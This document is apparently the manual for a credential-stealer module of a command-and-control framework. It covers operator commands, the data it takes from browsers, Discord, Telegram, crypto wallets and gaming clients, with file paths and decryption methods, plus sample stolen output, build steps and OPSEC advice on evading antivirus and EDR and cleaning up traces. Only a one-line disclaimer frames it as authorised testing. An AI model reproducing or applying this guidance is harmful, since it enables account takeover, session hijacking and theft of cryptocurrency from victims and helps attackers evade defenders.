# Credential Stealer Module

This document describes the stealer module capabilities for harvesting credentials and sensitive data from compromised systems.

## Overview

The stealer module (`stealer-dll`) is a dynamically loaded DLL that harvests credentials from:

| Category | Targets |
|----------|---------|
| **Browsers** | Chrome, Firefox, Edge, Brave, Opera, Vivaldi |
| **Communication** | Discord tokens, Telegram sessions |
| **Cryptocurrency** | Exodus, Atomic, Electrum, Metamask wallets |
| **Gaming** | Steam, Epic Games credentials |
| **Data Types** | Passwords, cookies, autofill, credit cards |

---

## Usage

```bash
# Select target agent
C2R2> /select 1

# Execute harvest
C2R2 [1]> /harvest
```

### First Execution

On first execution, the server:
1. Uploads `stealer.enc` (encrypted module, ~2MB)
2. Uploads `stealer.key` (encryption key)
3. Sends `__HARVEST__` command
4. Agent decrypts and loads the DLL
5. Agent executes `steal_credentials()`
6. Results are returned to server

### Subsequent Executions

The module is cached on the agent, so subsequent harvests are faster.

---

## Supported Targets

### Chromium-Based Browsers

**Supported:**
- Google Chrome
- Microsoft Edge
- Brave Browser
- Opera / Opera GX
- Vivaldi
- Chromium

**Data Stolen:**
- ✅ Saved passwords (decrypted via DPAPI)
- ✅ Cookies (including session cookies)
- ✅ Autofill data (names, addresses, phones)
- ✅ Credit card information
- ✅ Form history

**Technical Details:**
- Encryption: AES-256-GCM (Chrome v80+) or DPAPI (older)
- Database: SQLite (`Login Data`, `Web Data`, `Cookies`)
- Master key: Stored in `Local State` JSON file

### Firefox-Based Browsers

**Supported:**
- Mozilla Firefox
- Waterfox
- LibreWolf
- Firefox ESR

**Data Stolen:**
- ✅ Saved passwords
- ✅ Cookies
- ✅ Form history
- ⚠️ Credit cards (NOT supported - see limitations)

**Technical Details:**
- Encryption: NSS PK11SDR (3DES-CBC)
- Database: `logins.json` + `key4.db`
- Decryption requires NSS library

### Discord

**Location:** `%APPDATA%\Discord\Local Storage\leveldb`

**Targets:**
- Discord App
- Discord PTB (Public Test Build)
- Discord Canary

**Data Stolen:**
- ✅ Authentication tokens (`mfa.xxxx` or `Nxxxx` format)
- ✅ Multiple tokens if present

**Use Cases:**
- Account takeover
- Message reading
- Server access

### Telegram

**Location:** `%APPDATA%\Telegram Desktop\tdata`

**Data Stolen:**
- ✅ Session files (`key_data`, `D877F783D5D3EF8C*`)
- ✅ Complete session data for import

**Use Cases:**
- Session hijacking (import into new Telegram install)
- Message access
- Contact enumeration

### Cryptocurrency Wallets

**Supported Wallets:**

| Wallet | Location | Data |
|--------|----------|------|
| Exodus | `%APPDATA%\Exodus` | Wallet files, seed |
| Atomic | `%APPDATA%\atomic\Local Storage` | Wallet data |
| Electrum | `%APPDATA%\Electrum\wallets` | Wallet files |
| Metamask | Browser extension storage | Encrypted vault |
| Coinbase | Browser extension storage | Wallet data |

**⚠️ Warning:** Stolen wallet data can lead to complete loss of cryptocurrency funds.

### Gaming Platforms

**Steam:**
- Location: `C:\Program Files (x86)\Steam\config`
- Files: `loginusers.vdf`, `ssfn*` files
- Data: Username, Steam ID, session data

**Epic Games:**
- Location: `%LOCALAPPDATA%\EpicGamesLauncher\Saved`
- Data: Configuration, login tokens

---

## Output Format

Results are displayed in the server console and saved to `harvests/`:

```
═══ STOLEN DATA ═══
Total: 247 items found

=== Passwords (85) ===
[Chrome] https://gmail.com
  User: john@gmail.com
  Pass: MySecretPassword123

[Firefox] https://github.com
  User: johndoe
  Pass: GitHubP@ssw0rd

=== Cookies (120) ===
[Chrome] .google.com (Session)
  Name: SID
  Value: DQAAAMcAAAD...

=== Autofill (25) ===
[Chrome] John Doe
  Email: john@gmail.com
  Phone: +1234567890
  Address: 123 Main St, City, State 12345

=== Credit Cards (3) ===
[Chrome] Visa ****1234
  Expiry: 12/25
  Cardholder: JOHN DOE

=== Discord Tokens (2) ===
[Discord] mfa.Ab1Cd2Ef3Gh4Ij5Kl6Mn7Op8Qr9St0Uv1Wx2Yz3

=== Telegram Sessions (1) ===
[Telegram Desktop]
  Path: C:\Users\john\AppData\Roaming\Telegram Desktop\tdata
  Files: key_data, D877F783D5D3EF8C1, D877F783D5D3EF8C2

=== Wallets (2) ===
[Exodus]
  Path: C:\Users\john\AppData\Roaming\Exodus
  Found: wallet.dat, seed.seco

=== Gaming (2) ===
[Steam]
  User: steamuser123
  Steam ID: 76561198012345678

[*] Results saved to: harvests/client1_20240115_114523.txt
```

---

## Limitations

### Firefox Credit Cards

Firefox credit cards are **NOT** supported because they use a different encryption system:

| Data Type | Encryption | Supported |
|-----------|------------|-----------|
| Passwords | NSS PK11SDR (3DES) | ✅ Yes |
| Credit Cards | OS Keystore (DPAPI/Keychain) | ❌ No |

Firefox credit cards require the same user session and cannot be extracted offline.

### Browser Must Be Closed

SQLite database files may be locked while the browser is running. If harvest fails:
1. Try again (the stealer attempts shadow copy access)
2. Wait for browser to close
3. Results may be partial if databases are locked

### Encrypted Wallets

Cryptocurrency wallets with master passwords:
- Files are extracted but encrypted
- Requires separate password cracking
- Seed phrases not available if wallet is locked

---

## Technical Architecture

### Module Interface

```rust
// Exported C functions
extern "C" fn steal_credentials() -> *mut c_char
extern "C" fn free_credentials_string(s: *mut c_char)
extern "C" fn get_version() -> *mut c_char
```

### Decryption Methods

**Chromium (DPAPI + AES):**
```rust
fn decrypt_chromium_password(encrypted: &[u8]) -> Result<String> {
    // 1. Check for v10/v11/v20 prefix
    // 2. If v10/v11: decrypt with DPAPI master key + AES-256-GCM
    // 3. If older: direct DPAPI CryptUnprotectData
}
```

**Firefox (NSS):**
```rust
fn decrypt_firefox_password(encrypted: &str) -> Result<String> {
    // 1. Load nss3.dll
    // 2. Initialize NSS with profile path
    // 3. PK11SDR_Decrypt()
}
```

### File Locations

```
Chromium browsers:
  %LOCALAPPDATA%\{Browser}\User Data\Default\
    ├── Login Data      # Passwords
    ├── Cookies         # Cookies
    ├── Web Data        # Autofill, credit cards
    └── ../Local State  # Master key

Firefox:
  %APPDATA%\Mozilla\Firefox\Profiles\*.default*/
    ├── key4.db         # Master key database
    ├── logins.json     # Encrypted passwords
    └── cookies.sqlite  # Cookies
```

---

## OPSEC Considerations

### Detection Risk: **HIGH**

This operation is highly detectable:
- Significant disk I/O (database reads)
- DPAPI calls are logged
- Browser process monitoring
- Memory usage spike (~20MB)

### Recommendations

1. **Execute during off-hours** - Less monitoring, databases more likely unlocked
2. **Ensure AV/EDR is evaded** - Use anti-analysis checks first
3. **Harvest once** - Multiple harvests increase detection risk
4. **Review what you need** - Consider if you need ALL data types
5. **Clean up after** - Module files can be identified

### Execution Time

Typical harvest: 30-60 seconds depending on:
- Number of browsers installed
- Amount of saved data
- Database lock status

---

## Building the Module

```bash
# 1. Build the stealer DLL
./build-stealer.sh
# or
cargo build --release --target x86_64-pc-windows-gnu -p stealer-dll

# 2. Encrypt the module
cd builder
cargo run --release -- encrypt-module

# Output:
# - c2r2-server/modules/stealer.enc
# - c2r2-server/modules/stealer.key
```

---

## Troubleshooting

### "Module load failed"

1. Verify module files exist:
   ```bash
   ls c2r2-server/modules/stealer.*
   ```

2. Re-encrypt module:
   ```bash
   ./build-stealer.sh
   cd builder && cargo run --release -- encrypt-module
   ```

### Empty results

1. Browser may not have saved passwords
2. Database may be locked - retry when browser is closed
3. Profile path may be non-standard

### Partial results

- Some databases were locked
- Specific browser had errors
- Check server logs for details

---

## References

Implementation inspired by:
- [Satan-Stealer](https://github.com/its-vichy/Satan-Stealer)
- [FickerStealer techniques](https://research.nccgroup.com/fickerstealer/)

---

**⚠️ For authorized security testing purposes only. Harvesting credentials without authorization is illegal.**
